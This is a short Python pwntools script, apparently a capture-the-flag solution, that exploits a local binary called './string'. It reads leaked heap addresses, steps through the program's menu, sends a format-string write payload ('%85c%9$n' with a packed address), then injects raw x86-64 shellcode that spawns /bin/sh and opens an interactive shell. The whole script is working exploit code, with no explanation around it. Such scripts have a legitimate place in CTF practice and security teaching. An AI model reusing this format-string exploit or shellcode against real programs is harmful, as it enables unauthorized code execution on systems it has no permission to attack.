# coding:UTF-8
# author:iopr

from pwn import *
context(os='linux',arch='amd64')

Debug=1
if Debug:
    io=process('./string')
else:
    pass

def main():
    io.recvuntil('secret[0] is ')
    heap1=eval('0x'+io.recvuntil('\n')[0:-1])
    io.recvuntil('secret[1] is ')
    heap2=eval('0x'+io.recvuntil('\n')[0:-1])
    io.recv()
    io.sendline('a')
    io.recv()
    io.sendline('east')
    io.recv()
    io.sendline('1')
    io.recv()
    io.sendline('1')
    io.recv(timeout=0.1)
    io.sendline('%85c%9$n'+p64(heap1))
    io.recv()
    io.sendline("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
    io.interactive()

pause()
main()